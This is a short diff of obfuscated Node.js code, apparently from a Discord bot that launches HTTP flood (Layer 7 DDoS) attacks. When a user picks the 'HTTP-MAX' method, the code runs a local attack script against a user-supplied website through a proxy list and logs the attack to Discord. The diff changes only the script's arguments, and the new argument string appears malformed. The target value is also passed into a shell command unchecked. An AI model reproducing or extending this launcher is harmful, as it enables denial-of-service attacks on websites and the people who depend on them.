@@ -204,7 +204,7 @@ module['exports'] = {
             if (_0xf396x9 === 'HTTP-MAX') {
             var method = _0xf396x9;
             const { exec } = require('child_process');
-            exec(`${'node basic/L7/'}${method}${'.js '}${website}${' 60 5 http.txt'}`, (_0xf396xd, _0xf396xe, _0xf396xf) => {});
+            exec(`${'node basic/L7/'}${method}${'.js '}${website}${'  5 60http.txt'}`, (_0xf396xd, _0xf396xe, _0xf396xf) => {});
             console['log']('A attack run ID Discord:' + _0xf396x8['guild']['id']);
             const _0xf396x10 = new MessageEmbed()['setColor']('RANDOM')['setTitle'](version)['addFields']({
                 name: '**`\uD83D\uDC68\u200D\uD83D\uDCBB User:`**',
